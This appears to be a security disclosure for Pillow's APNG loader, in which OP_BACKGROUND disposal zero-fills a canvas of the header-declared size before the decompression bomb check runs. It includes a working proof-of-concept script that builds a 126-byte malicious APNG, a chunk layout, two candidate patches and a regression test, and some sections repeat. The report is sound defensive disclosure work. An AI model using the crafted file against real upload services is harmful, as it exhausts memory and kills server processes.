PngImagePlugin.putchunk(\n+        b,\n+        b\"fcTL\",\n+        o32(0),  # sequence number\n+        o32(1),  # width\n+        o32(1),  # height\n+        o32(0),  # x offset\n+        o32(0),  # y offset\n+        o16(1),  # delay numerator\n+        o16(10),  # delay denominator\n+        bytes([PngImagePlugin.Disposal.OP_BACKGROUND, PngImagePlugin.Blend.OP_SOURCE]),\n+    )\n+    PngImagePlugin.putchunk(b, b\"IDAT\")\n+    PngImagePlugin.putchunk(b, b\"IEND\")\n+\n+    with pytest.raises(Image.DecompressionBombError):\n+        Image.open(b)\n+\n+\n def test_apng_blend() -\u003e None:\n     with Image.open(\"Tests/images/apng/blend_op_source_solid.png\") as im:\n         assert isinstance(im, PngImagePlugin.PngImageFile)\ndiff --git a/src/PIL/PngImagePlugin.py b/src/PIL/PngImagePlugin.py\nindex 0eb2fd5e4..24fa587c1 100644\n--- a/src/PIL/PngImagePlugin.py\n+++ b/src/PIL/PngImagePlugin.py\n@@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):\n             # ensure previous frame was loaded\n             self.load()\n \n+            if self.dispose_op == Disposal.OP_BACKGROUND:\n+                # Created here rather than in the previous _seek(), so that\n+                # nothing is allocated from the declared image size before\n+                # the decompression bomb check in Image.open() has run.\n+                # Only dispose the extent of the previous frame.\n+                x0, y0, x1, y1 = self.dispose_extent\n+                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))\n             if self.dispose:\n                 self.im.paste(self.dispose, self.dispose_extent)\n             self._prev_im = self.im.copy()\n@@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):\n             if self._prev_im:\n                 self.dispose = self._prev_im.copy()\n                 self.dispose = self._crop(self.dispose, self.dispose_extent)\n-        elif self.dispose_op == Disposal.OP_BACKGROUND:\n-            self.dispose = Image.core.fill(self.mode, self.size)\n-            self.dispose = self._crop(self.dispose, self.dispose_extent)\n \n     def tell(self) -\u003e int:\n         return self.__frame\n```\n\n## The patch (2 of 2)\n\nBomb-check and fill only the fcTL extent for APNG OP_BACKGROUND disposal instead of a full IHDR-sized canvas in PngImageFile._seek()\n\nApplies to `src/PIL/PngImagePlugin.py` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py\nindex 15689476c..6e61c8b4b 100644\n--- a/Tests/test_file_apng.py\n+++ b/Tests/test_file_apng.py\n@@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -\u003e None:\n         assert im.size == (128, 64)\n \n \n+def test_apng_dispose_op_background_decompression_bomb() -\u003e None:\n+    # The disposal image must not be created from the declared image size\n+    # before the decompression bomb check in Image.open() has run.\n+    # A canvas this wide cannot be allocated, so if it is attempted,\n+    # a MemoryError is raised instead of a DecompressionBombError.\n+    o16 = PngImagePlugin.o16\n+    o32 = PngImagePlugin.o32\n+\n+    b = BytesIO()\n+    b.write(PngImagePlugin._MAGIC)\n+    PngImagePlugin.putchunk(b, b\"IHDR\", o32(2**31 - 1), o32(1), b\"\\x08\\x06\\x00\\x00\\x00\")\n+    PngImagePlugin.putchunk(b, b\"acTL\", o32(2), o32(0))\n+    PngImagePlugin.putchunk(\n+        b,\n+        b\"fcTL\",\n+        o32(0),  # sequence number\n+        o32(1),  # width\n+        o32(1),  # height\n+        o32(0),  # x offset\n+        o32(0),  # y offset\n+        o16(1),  # delay numerator\n+        o16(10),  # delay denominator\n+        bytes([PngImagePlugin.Disposal.OP_BACKGROUND, PngImagePlugin.Blend.OP_SOURCE]),\n+    )\n+    PngImagePlugin.putchunk(b, b\"IDAT\")\n+    PngImagePlugin.putchunk(b, b\"IEND\")\n+\n+    with pytest.raises(Image.DecompressionBombError):\n+        Image.open(b)\n+\n+\n def test_apng_blend() -\u003e None:\n     with Image.open(\"Tests/images/apng/blend_op_source_solid.png\") as im:\n         assert isinstance(im, PngImagePlugin.PngImageFile)\ndiff --git a/src/PIL/PngImagePlugin.py b/src/PIL/PngImagePlugin.py\nindex 0eb2fd5e4..0111a17d7 100644\n--- a/src/PIL/PngImagePlugin.py\n+++ b/src/PIL/PngImagePlugin.py\n@@ -985,7 +985,7 @@ class PngImageFile(ImageFile.ImageFile):\n                 msg = \"image not found in APNG frame\"\n                 raise EOFError(msg)\n         if dispose_extent:\n-            self.dispose_extent: tuple[float, float, float, float] = dispose_extent\n+            self.dispose_extent: tuple[int, int, int, int] = dispose_extent\n \n         # setup frame disposal (actual disposal done when needed in the next _seek())\n         if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:\n@@ -997,8 +997,14 @@ class PngImageFile(ImageFile.ImageFile):\n                 self.dispose = self._prev_im.copy()\n                 self.dispose = self._crop(self.dispose, self.dispose_extent)\n         elif self.dispose_op == Disposal.OP_BACKGROUND:\n-            self.dispose = Image.core.fill(self.mode, self.size)\n-            self.dispose = self._crop(self.dispose, self.dispose_extent)\n+            # only dispose the extent in this frame, rather than filling an\n+            # image of the declared size before Image.open() has been able to\n+            # run the decompression bomb check\n+            x0, y0, x1, y1 = self.dispose_extent\n+            dispose_size = (x1 - x0, y1 - y0)\n+\n+            Image._decompression_bomb_check(dispose_size)\n+            self.dispose = Image.core.fill(self.mode, dispose_size)\n \n     def tell(self) -\u003e int:\n         return self.__frame\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 3,564 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nImage.open() on a 126-byte APNG allocates and zero-fills a full canvas of the\nheader-declared size *before* Pillow's decompression-bomb check rejects it.\n\nWe build two PNGs that are identical except for one byte, the first fcTL\nchunk's dispose_op:\n\n    control: dispose_op = 0  (OP_NONE)\n    attack:  dispose_op = 1  (OP_BACKGROUND)\n\nBoth declare 22000x22000 RGBA (484 Mpixel, above the 2 * MAX_IMAGE_PIXELS\nerror threshold), so Image.open() must reject both with DecompressionBombError\n-- and that check exists precisely so the rejection is cheap. For the attack\nfile, PngImageFile._open() -\u003e _seek(0) first runs\nImage.core.fill(mode, (22000, 22000)), touching ~1.9 GB, and only then is the\nbomb check reached.\n\nEach file is opened in a fresh interpreter that reports its own peak RSS.\n\"\"\"\nimport struct\nimport subprocess\nimport sys\nimport zlib\n\nSIZE = 22000  # 22000 * 22000 * 4 bytes = 1.94 GB canvas\n\n\ndef chunk(cid, data):\n    crc = zlib.crc32(cid + data)\n    return struct.pack(\"\u003eI\", len(data)) + cid + data + struct.pack(\"\u003eI\", crc)\n\n\ndef build_apng(dispose_op):\n    ihdr = struct.pack(\"\u003eIIBBBBB\", SIZE, SIZE, 8, 6, 0, 0, 0)  # 8-bit RGBA\n    actl = struct.pack(\"\u003eII\", 2, 0)  # animated: 2 frames -\u003e _open() calls _seek(0)\n    # frame 0: seq 0, a 1x1 rectangle at (0,0) (passes fcTL's bounds check),\n    # delay 1/10 s, the dispose_op under test, blend_op 0\n    fctl = struct.pack(\"\u003eIIIIIHHBB\", 0, 1, 1, 0, 0, 1, 10, dispose_op, 0)\n    idat = zlib.compress(b\"\\x00\" + b\"\\x00\\x00\\x00\\x00\")  # one 1x1 RGBA scanline\n    return (b\"\\x89PNG\\r\\n\\x1a\\n\" + chunk(b\"IHDR\", ihdr) + chunk(b\"acTL\", actl)\n            + chunk(b\"fcTL\", fctl) + chunk(b\"IDAT\", idat) + chunk(b\"IEND\", b\"\"))\n\n\n# What an application does with an untrusted upload: Image.open() with default\n# settings, no load(). Prints the outcome and this process's peak RSS in MB.\nOPEN_UNTRUSTED = \"\"\"\nimport io, resource, sys\nfrom PIL import Image\ntry:\n    Image.open(io.BytesIO(sys.stdin.buffer.read()))\n    outcome = \"opened\"\nexcept Exception as e:\n    outcome = type(e).__name__\nprint(outcome, resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024)\n\"\"\"\n\n\ndef open_in_child(data):\n    p = subprocess.run([sys.executable, \"-c\", OPEN_UNTRUSTED], input=data,\n                       capture_output=True, timeout=60)\n    if p.returncode == -9:  # SIGKILL: OOM-killed on a small host -- also the bug\n        return \"oom-killed(rc=-9)\", None\n    if p.returncode != 0:  # anything else is a harness failure, not evidence\n        print(p.stdout.decode(), p.stderr.decode(), sep=\"\\n\")\n        print(\"child failed unexpectedly (rc=%d)\" % p.returncode)\n        print(\"OK\")\n        sys.exit(1)\n    outcome, peak_mb = p.stdout.split()\n    return outcome.decode(), int(peak_mb)\n\n\ncontrol = build_apng(dispose_op=0)\nattack = build_apng(dispose_op=1)\n\nc_outcome, c_mb = open_in_child(control)\na_outcome, a_mb = open_in_child(attack)\n\nprint(\"%d-byte APNG declaring %dx%d RGBA; Image.open(BytesIO(data)), defaults\"\n      % (len(attack), SIZE, SIZE))\nprint(\"  control  dispose_op=0 OP_NONE        -\u003e %-22s peak RSS %5s MB\" % (c_outcome, c_mb))\nprint(\"  attack   dispose_op=1 OP_BACKGROUND  -\u003e %-22s peak RSS %5s MB\" % (a_outcome, a_mb))\n\n# Expected: both rejected at roughly interpreter size. Bug: the attack file\n# made the \"cheap\" rejection cost a full-size canvas (or killed the process).\nif a_mb is None or (a_mb \u003e= 1000 and a_mb \u003e= 20 * c_mb):\n    print(\"Image.open() touched a full %dx%d canvas before the bomb check ran\"\n          % (SIZE, SIZE))\n    print(\"BUG\")\nelse:\n    print(\"OK\")\n```\n\u003c/details\u003e\n\n---",
                "text": "```\n============================================================================\nAPNG background disposal allocates full canvas before decompression bomb check\nLocation: src/PIL/PngImagePlugin.py:1000  in PngImageFile._seek()\nCommit:   a707c6b21c313880d0771e54965d142dd42358b6\n============================================================================\n```\n\nA 126-byte animated PNG file makes Pillow's `Image.open()` allocate and fill memory sized by the image dimensions the file claims, before Pillow's built-in check for oversized images runs. A file claiming 22000×22000 pixels costs about 1.9 GB. Anyone who can get an application to open an image they supply, with default settings and no further calls such as `load()`, can cause a multi-gigabyte memory spike per file. If the claimed size exceeds the machine's free memory, the operating system kills the process outright.\n\nThe bug is in `PngImageFile._seek()` in `src/PIL/PngImagePlugin.py` (around line 1000). For any APNG, `_open()` calls `self._seek(0)`. When the first `fcTL` chunk requests `OP_BACKGROUND` disposal, `_seek()` calls `Image.core.fill(self.mode, self.size)` with the full IHDR size, which allocates and zero-fills width×height×4 bytes. `OP_PREVIOUS` takes the same path, because frame 0 rewrites it to `OP_BACKGROUND`. This all happens inside the plugin factory, so `Image.open()`'s `_decompression_bomb_check(im.size)` only runs after the memory has been touched. A 1×1 frame rectangle passes the only checks on the way.\n\nBelow available memory, the allocation is freed when `DecompressionBombError` propagates, so sustained pressure needs repeated or concurrent uploads. A 45000×45000 header gets the process killed by the out-of-memory killer on an 8 GB host. The attached reproducer opens two such files that differ in one byte (`dispose_op` 0 vs 1). Both end in `DecompressionBombError`, but peak resident memory is 17 MB for the first and 1864 MB for the second. The eager fill was introduced in 5e4e0fa6ee67 (\"Use disposal settings from previous frame\", December 2020) and first shipped in 8.1.0. Two candidate patches with a regression test are attached.\n\n## Details\n\nFor an APNG whose first `fcTL` chunk requests `OP_BACKGROUND` disposal, `PngImageFile._open()` creates and zero-fills a core image of the full IHDR-declared size. This happens inside the plugin factory, i.e. before `Image.open()` gets to `_decompression_bomb_check(im.size)`, so the check that is meant to reject oversized headers without allocating anything runs only after the allocation has been made and touched.\n\nThe following 126-byte file (all chunk lengths and CRCs valid) makes `Image.open(io.BytesIO(data))`, with default `MAX_IMAGE_PIXELS` and no `load()`, reach 1.86 GB resident (`ru_maxrss`) and then raise `DecompressionBombError`. The byte-identical file with `dispose_op=0` raises the same error at 17 MB.\n\n```\nIHDR  width=22000 height=22000 bit_depth=8 colour_type=6 (RGBA)\nacTL  num_frames=2 num_plays=0\nfcTL  seq=0 w=1 h=1 x=0 y=0 delay=1/10 dispose_op=1 (OP_BACKGROUND) blend_op=0\nIDAT  zlib(00 00 00 00 00)                      # one 1x1 RGBA scanline\nIEND\n```\n\nWith `width=height=45000` (8.1 GB canvas) the same call attempts the full allocation: under a 4 GiB `RLIMIT_AS` it fails with `MemoryError` from the allocator instead of `DecompressionBombError`; without a cap, on an 8 GB host with no swap, the process is OOM-killed.\n\n### Code path\n\n`Image.open()` runs the bomb check only after the plugin's constructor (and therefore `_open()`) has returned:\n\n```python\n# src/PIL/Image.py:3699-3701\n                    im = factory(fp, filename)\n                    _decompression_bomb_check(im.size)\n                    return im\n```\n\nFor a plain PNG that ordering is fine: `PngImageFile._open()` only parses chunks up to the first `IDAT` and records `self._size` from `IHDR`; nothing is allocated from it. For an APNG (`acTL` seen, so `im_n_frames` is set) `_open()` additionally positions on frame 0:\n\n```python\n# src/PIL/PngImagePlugin.py:845-853\n        if self.png.im_n_frames is not None:\n            …\n            self._seek(0)\n```\n\n`_seek(0)` copies `disposal` and `bbox` from the `fcTL` chunk into `self.dispose_op` / `self.dispose_extent` and then prepares the disposal image for the *next* frame eagerly, using the full image size:\n\n```python\n# src/PIL/PngImagePlugin.py:991-1001\n        if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:\n            self.dispose_op = Disposal.OP_BACKGROUND\n\n        self.dispose = None\n        if self.dispose_op == Disposal.OP_PREVIOUS:\n            …\n        elif self.dispose_op == Disposal.OP_BACKGROUND:\n            self.dispose = Image.core.fill(self.mode, self.size)\n            self.dispose = self._crop(self.dispose, self.dispose_extent)\n```\n\n`Image.core.fill` is `_fill()` in `src/_imaging.c:711`, which does `ImagingNewDirty(mode, xsize, ysize)` followed by `ImagingFill()`; `ImagingFill` (`src/libImaging/Fill.c:23`) writes every row, so the whole `width*height*4` bytes become resident rather than merely reserved. `self.size` here is the IHDR size (22000×22000), not the 1×1 frame rectangle. The `_crop` on the next line does call `_decompression_bomb_check`, but on the `fcTL` rectangle (1×1) and only after the fill has completed. Lines 991-992 rewrite `OP_PREVIOUS` to `OP_BACKGROUND` on frame 0, so `dispose_op=2` takes the same path (verified: identical 1.86 GB peak). When the first `fcTL` rectangle is large, the `_crop` copy is a second extent-sized buffer on top of the full-canvas fill, so the transient peak can reach about twice the canvas: a 13000×13000 full-frame `fcTL` (below the error threshold, so `Image.open()` succeeds with only a `DecompressionBombWarning`) peaks at 1.31 GB for a 0.66 GB canvas.\n\nThe only validation `chunk_fcTL` applies (`src/PIL/PngImagePlugin.py:740-745`) is that the frame rectangle fits inside the IHDR size, which a 1×1 frame always does; IHDR width/height themselves are unconstrained 32-bit values at this point. Control then returns to `_open_core`, `_decompression_bomb_check((22000, 22000))` raises, and the 1.9 GB core image is released when the half-constructed `PngImageFile` is discarded.\n\nThe eager full-size fill in `_seek()` was introduced in `5e4e0fa6ee67` (\"Use disposal settings from previous frame\", 2020-12-24) and first shipped in 8.1.0; before it, the `OP_BACKGROUND` fill lived in `load_end()` and could not be reached from `Image.open()`.\n\n## Impact\n\nAny application that calls `Image.open()` on untrusted bytes with default settings — the configuration in which the decompression-bomb check is supposed to make that call cheap and safe — can be made to allocate and write an attacker-chosen amount of memory from a ~126-byte PNG upload, before any error is reported and without `load()`, frame iteration, or `LOAD_TRUNCATED_IMAGES`. The amount is set directly by the IHDR width/height (4 bytes per pixel for colour type 6): values below the host's free memory cause a transient multi-GB spike per request (≈15,000,000× amplification at 22000×22000) that is freed when the exception propagates, so concurrent or repeated uploads are needed to sustain pressure; values above it get the worker process OOM-killed outright. PNG is accepted by essentially every upload pipeline, and the file passes `_accept` and chunk CRC checks as a well-formed APNG.\n\nThis is the same class as the recent bomb-check additions for WMF (load at a different DPI), FITS, GIF and FontFile — an allocation sized from file-declared numbers on a path `_decompression_bomb_check` does not cover — but here the uncovered path is `Image.open()` itself rather than a later `load()`/`seek()`.\n\n## Reproducing\n\n`repro` is a single Python script (no build step, no companion files). It builds two PNGs in memory, opens each one with plain `Image.open(io.BytesIO(data))` in a fresh child interpreter using default settings and no `load()`, and has each child report the exception it got and its own peak RSS (`ru_maxrss`). It needs about 2 GB of free RAM and finishes in about a second.\n\nThe two files are 126 bytes each and differ in exactly one byte, the `dispose_op` of the first `fcTL` chunk: `0` (`OP_NONE`) for the control and `1` (`OP_BACKGROUND`) for the attack. Both declare IHDR 22000×22000 RGBA. That is 484 Mpixel, above the 2×`MAX_IMAGE_PIXELS` error threshold, so `Image.open()` has to reject both with `DecompressionBombError`. Each chunk has a job:\n\n- The `acTL` chunk (2 frames) makes `_open()` call `_seek(0)`.\n- The 1×1 `fcTL` rectangle passes `chunk_fcTL`'s bounds check and `_crop`'s bomb check.\n- The one-scanline `IDAT` ends header parsing.\n\nExpected output on this tree:\n\n```\n126-byte APNG declaring 22000x22000 RGBA; Image.open(BytesIO(data)), defaults\n  control  dispose_op=0 OP_NONE        -\u003e DecompressionBombError peak RSS    17 MB\n  attack   dispose_op=1 OP_BACKGROUND  -\u003e DecompressionBombError peak RSS  1864 MB\nImage.open() touched a full 22000x22000 canvas before the bomb check ran\nBUG\n```\n\nBoth files are rejected, but the control is rejected at interpreter size. The attack file only reaches the bomb check after `Image.core.fill(\"RGBA\", (22000, 22000))` has allocated and zero-filled about 1.9 GB. The script prints `BUG` if the attack child's peak RSS is at least 1000 MB and at least 20× the control's, or if the attack child is killed by `SIGKILL` (for example by the OOM killer on a small host). Otherwise it prints `OK`; any other non-zero child exit is treated as a harness failure, printed with the child's output, and also ends in `OK`. With either attached patch applied, both children report about 17–22 MB and the script prints `OK`.\n\nThe allocation grows with the header, so it can be scaled by changing `SIZE` in the script. The 45000×45000 case (an 8.1 GB canvas) is covered in Details and is not part of the script.\n\n## Suggested fix\n\nDo not build the `OP_BACKGROUND` disposal image from the declared size during `_open()`. Two alternative patches are attached; both change only `src/PIL/PngImagePlugin.py`, and both add the same regression test to `Tests/test_file_apng.py` (a 2³¹−1 × 1 APNG built in memory with a 1×1 `OP_BACKGROUND` first frame must make `Image.open()` raise `DecompressionBombError`; on the current tree the fill fails first with `MemoryError`). Attached patch 1 is the preferred fix.\n\n**Attached patch 1** moves the fill to its only point of use, the `frame \u003e 0` branch of `_seek()` right after `self.load()` — which can only run once `Image.open()` has returned (bomb check passed) and the canvas itself has been allocated — and, as `GifImagePlugin` already does, fills only the previous frame's dispose extent instead of a full canvas that is then cropped:\n\n```diff\n--- a/src/PIL/PngImagePlugin.py\n+++ b/src/PIL/PngImagePlugin.py\n@@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):\n             # ensure previous frame was loaded\n             self.load()\n \n+            if self.dispose_op == Disposal.OP_BACKGROUND:\n+                # Created here rather than in the previous _seek(), so that\n+                # nothing is allocated from the declared image size before\n+                # the decompression bomb check in Image.open() has run.\n+                # Only dispose the extent of the previous frame.\n+                x0, y0, x1, y1 = self.dispose_extent\n+                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))\n             if self.dispose:\n                 self.im.paste(self.dispose, self.dispose_extent)\n             self._prev_im = self.im.copy()\n@@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):\n             if self._prev_im:\n                 self.dispose = self._prev_im.copy()\n                 self.dispose = self._crop(self.dispose, self.dispose_extent)\n-        elif self.dispose_op == Disposal.OP_BACKGROUND:\n-            self.dispose = Image.core.fill(self.mode, self.size)\n-            self.dispose = self._crop(self.dispose, self.dispose_extent)\n```\n\nAt that point `self.dispose_op` and `self.dispose_extent` still hold the previous frame's values (they are reassigned further down in `_seek`), so disposal semantics are unchanged; the `OP_PREVIOUS` copy stays eager because `load_end()` pastes into `_prev_im` in place (`src/PIL/PngImagePlugin.py:1110`). With this patch `Image.open()` allocates nothing from the declared size, including in the `DecompressionBombWarning` range.\n\n**Attached patch 2** is a smaller diff that keeps the eager disposal setup in `_seek()` and mirrors `GifImagePlugin._seek()`'s `OP_BACKGROUND` handling exactly: it computes the size of the `fcTL` rectangle (already validated by `chunk_fcTL` to lie within the image), runs `Image._decompression_bomb_check()` on it, and fills an image of only that size instead of filling `self.size` and cropping. It also narrows the `dispose_extent` annotation to `tuple[int, int, int, int]` so the bomb-check call type-checks. The trade-off is that a full-canvas first frame still allocates a bomb-checked image inside `Image.open()` — up to about 2×`MAX_IMAGE_PIXELS`×4 bytes (660 MB for a 13000×13000 full-frame `fcTL`, with `DecompressionBombWarning`) — and a first `fcTL` covering a canvas above the error threshold now raises `DecompressionBombError` from `_seek(0)` rather than from `Image.open()`'s own check.\n\nWith either patch applied to a clean checkout, the reproducer prints `OK` and all 54 files in `Tests/images/apng/` decode byte-identically frame by frame, including after a rewind.\n\n## The patch (1 of 2)\n\nCreate the APNG OP_BACKGROUND disposal image when the next frame is sought, sized to the frame extent, not in _open() from the IHDR size\n\nApplies to `src/PIL/PngImagePlugin.py` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py\nindex 15689476c..6e61c8b4b 100644\n--- a/Tests/test_file_apng.py\n+++ b/Tests/test_file_apng.py\n@@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -\u003e None:\n         assert im.size == (128, 64)\n \n \n+def test_apng_dispose_op_background_decompression_bomb() -\u003e None:\n+    # The disposal image must not be created from the declared image size\n+    # before the decompression bomb check in Image.open() has run.\n+    # A canvas this wide cannot be allocated, so if it is attempted,\n+    # a MemoryError is raised instead of a DecompressionBombError.\n+    o16 = PngImagePlugin.o16\n+    o32 = PngImagePlugin.o32\n+\n+    b = BytesIO()\n+    b.write(PngImagePlugin._MAGIC)\n+    PngImagePlugin.putchunk(b, b\"IHDR\", o32(2**31 - 1), o32(1), b\"\\x08\\x06\\x00\\x00\\x00\")\n+    PngImagePlugin.putchunk(b, b\"acTL\", o32(2), o32(0))\n+    PngImagePlugin.putchunk(\n+        b,\n+        b\"fcTL\",\n+        o32(0),  # sequence number\n+        o32(1),  # width\n+        o32(1),  # height\n+        o32(0),  # x offset\n+        o32(0),  # y offset\n+        o16(1),  # delay numerator\n+        o16(10),  # delay denominator\n+        bytes([PngImagePlugin.Disposal.OP_BACKGROUND, PngImagePlugin.Blend.OP_SOURCE]),\n+    )\n+    PngImagePlugin.putchunk(b, b\"IDAT\")\n+    PngImagePlugin.putchunk(b, b\"IEND\")\n+\n+    with pytest.raises(Image.DecompressionBombError):\n+        Image.open(b)\n+\n+\n def test_apng_blend() -\u003e None:\n     with Image.open(\"Tests/images/apng/blend_op_source_solid.png\") as im:\n         assert isinstance(im, PngImagePlugin.PngImageFile)\ndiff --git a/src/PIL/PngImagePlugin.py b/src/PIL/PngImagePlugin.py\nindex 0eb2fd5e4..24fa587c1 100644\n--- a/src/PIL/PngImagePlugin.py\n+++ b/src/PIL/PngImagePlugin.py\n@@ -931,6 +931,13 @@ class PngImageFile(ImageFile.ImageFile):\n             # ensure previous frame was loaded\n             self.load()\n \n+            if self.dispose_op == Disposal.OP_BACKGROUND:\n+                # Created here rather than in the previous _seek(), so that\n+                # nothing is allocated from the declared image size before\n+                # the decompression bomb check in Image.open() has run.\n+                # Only dispose the extent of the previous frame.\n+                x0, y0, x1, y1 = self.dispose_extent\n+                self.dispose = Image.core.fill(self.mode, (x1 - x0, y1 - y0))\n             if self.dispose:\n                 self.im.paste(self.dispose, self.dispose_extent)\n             self._prev_im = self.im.copy()\n@@ -996,9 +1003,6 @@ class PngImageFile(ImageFile.ImageFile):\n             if self._prev_im:\n                 self.dispose = self._prev_im.copy()\n                 self.dispose = self._crop(self.dispose, self.dispose_extent)\n-        elif self.dispose_op == Disposal.OP_BACKGROUND:\n-            self.dispose = Image.core.fill(self.mode, self.size)\n-            self.dispose = self._crop(self.dispose, self.dispose_extent)\n \n     def tell(self) -\u003e int:\n         return self.__frame\n```\n\n## The patch (2 of 2)\n\nBomb-check and fill only the fcTL extent for APNG OP_BACKGROUND disposal instead of a full IHDR-sized canvas in PngImageFile._seek()\n\nApplies to `src/PIL/PngImagePlugin.py` at the commit above.\n\n```diff\ndiff --git a/Tests/test_file_apng.py b/Tests/test_file_apng.py\nindex 15689476c..6e61c8b4b 100644\n--- a/Tests/test_file_apng.py\n+++ b/Tests/test_file_apng.py\n@@ -161,6 +161,37 @@ def test_apng_dispose_op_background_p_mode() -\u003e None:\n         assert im.size == (128, 64)\n \n \n+def test_apng_dispose_op_background_decompression_bomb() -\u003e None:\n+    # The disposal image must not be created from the declared image size\n+    # before the decompression bomb check in Image.open() has run.\n+    # A canvas this wide cannot be allocated, so if it is attempted,\n+    # a MemoryError is raised instead of a DecompressionBombError.\n+    o16 = PngImagePlugin.o16\n+    o32 = PngImagePlugin.o32\n+\n+    b = BytesIO()\n+    b.write(PngImagePlugin._MAGIC)\n+    PngImagePlugin.putchunk(b, b\"IHDR\", o32(2**31 - 1), o32(1), b\"\\x08\\x06\\x00\\x00\\x00\")\n+    PngImagePlugin.putchunk(b, b\"acTL\", o32(2), o32(0))\n+    PngImagePlugin.putchunk(\n+        b,\n+        b\"fcTL\",\n+        o32(0),  # sequence number\n+        o32(1),  # width\n+        o32(1),  # height\n+        o32(0),  # x offset\n+        o32(0),  # y offset\n+        o16(1),  # delay numerator\n+        o16(10),  # delay denominator\n+        bytes([PngImagePlugin.Disposal.OP_BACKGROUND, PngImagePlugin.Blend.OP_SOURCE]),\n+    )\n+    PngImagePlugin.putchunk(b, b\"IDAT\")\n+    PngImagePlugin.putchunk(b, b\"IEND\")\n+\n+    with pytest.raises(Image.DecompressionBombError):\n+        Image.open(b)\n+\n+\n def test_apng_blend() -\u003e None:\n     with Image.open(\"Tests/images/apng/blend_op_source_solid.png\") as im:\n         assert isinstance(im, PngImagePlugin.PngImageFile)\ndiff --git a/src/PIL/PngImagePlugin.py b/src/PIL/PngImagePlugin.py\nindex 0eb2fd5e4..0111a17d7 100644\n--- a/src/PIL/PngImagePlugin.py\n+++ b/src/PIL/PngImagePlugin.py\n@@ -985,7 +985,7 @@ class PngImageFile(ImageFile.ImageFile):\n                 msg = \"image not found in APNG frame\"\n                 raise EOFError(msg)\n         if dispose_extent:\n-            self.dispose_extent: tuple[float, float, float, float] = dispose_extent\n+            self.dispose_extent: tuple[int, int, int, int] = dispose_extent\n \n         # setup frame disposal (actual disposal done when needed in the next _seek())\n         if self._prev_im is None and self.dispose_op == Disposal.OP_PREVIOUS:\n@@ -997,8 +997,14 @@ class PngImageFile(ImageFile.ImageFile):\n                 self.dispose = self._prev_im.copy()\n                 self.dispose = self._crop(self.dispose, self.dispose_extent)\n         elif self.dispose_op == Disposal.OP_BACKGROUND:\n-            self.dispose = Image.core.fill(self.mode, self.size)\n-            self.dispose = self._crop(self.dispose, self.dispose_extent)\n+            # only dispose the extent in this frame, rather than filling an\n+            # image of the declared size before Image.open() has been able to\n+            # run the decompression bomb check\n+            x0, y0, x1, y1 = self.dispose_extent\n+            dispose_size = (x1 - x0, y1 - y0)\n+\n+            Image._decompression_bomb_check(dispose_size)\n+            self.dispose = Image.core.fill(self.mode, dispose_size)\n \n     def tell(self) -\u003e int:\n         return self.__frame\n```\n\n## The reproducer\n\n\u003cdetails\u003e\n\u003csummary\u003eReproducer — \u003ccode\u003erepro\u003c/code\u003e, 3,564 bytes (click to open)\u003c/summary\u003e\n\nIts last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`.\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nImage.open() on a 126-byte APNG allocates and zero-fills a full canvas of the\nheader-declared size *before* Pillow's decompression-bomb check rejects it.\n\nWe build two PNGs that are identical except for one byte, the first fcTL\nchunk's dispose_op:\n\n    control: dispose_op = 0  (OP_NONE)\n    attack:  dispose_op = 1  (OP_BACKGROUND)\n\nBoth declare 22000x22000 RGBA (484 Mpixel, above the 2 * MAX_IMAGE_PIXELS\nerror threshold), so Image.open() must reject both with DecompressionBombError\n-- and that check exists precisely so the rejection is cheap. For the attack\nfile, PngImageFile._open() -\u003e _seek(0) first runs\nImage.core.fill(mode, (22000, 22000)), touching ~1.9 GB, and only then is the\nbomb check reached.\n\nEach file is opened in a fresh interpreter that reports its own peak RSS.\n\"\"\"\nimport struct\nimport subprocess\nimport sys\nimport zlib\n\nSIZE = 22000  # 22000 * 22000 * 4 bytes = 1.94 GB canvas\n\n\ndef chunk(cid, data):\n    crc = zlib.crc32(cid + data)\n    return struct.pack(\"\u003eI\", len(data)) + cid + data + struct.pack(\"\u003eI\", crc)\n\n\ndef build_apng(dispose_op):\n    ihdr = struct.pack(\"\u003eIIBBBBB\", SIZE, SIZE, 8, 6, 0, 0, 0)  # 8-bit RGBA\n    actl = struct.pack(\"\u003eII\", 2, 0)  # animated: 2 frames -\u003e _open() calls _seek(0)\n    # frame 0: seq 0, a 1x1 rectangle at (0,0) (passes fcTL's bounds check),\n    # delay 1/10 s, the dispose_op under test, blend_op 0\n    fctl = struct.pack(\"\u003eIIIIIHHBB\", 0, 1, 1, 0, 0, 1, 10, dispose_op, 0)\n    idat = zlib.compress(b\"\\x00\" + b\"\\x00\\x00\\x00\\x00\")  # one 1x1 RGBA scanline\n    return (b\"\\x89PNG\\r\\n\\x1a\\n\" + chunk(b\"IHDR\", ihdr) + chunk(b\"acTL\", actl)\n            + chunk(b\"fcTL\", fctl) + chunk(b\"IDAT\", idat) + chunk(b\"IEND\", b\"\"))\n\n\n# What an application does with an untrusted upload: Image.open() with default\n# settings, no load(). Prints the outcome and this process's peak RSS in MB.\nOPEN_UNTRUSTED = \"\"\"\nimport io, resource, sys\nfrom PIL import Image\ntry:\n    Image.open(io.BytesIO(sys.stdin.buffer.read()))\n    outcome = \"opened\"\nexcept Exception as e:\n    outcome = type(e).__name__\nprint(outcome, resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024)\n\"\"\"\n\n\ndef open_in_child(data):\n    p = subprocess.run([sys.executable, 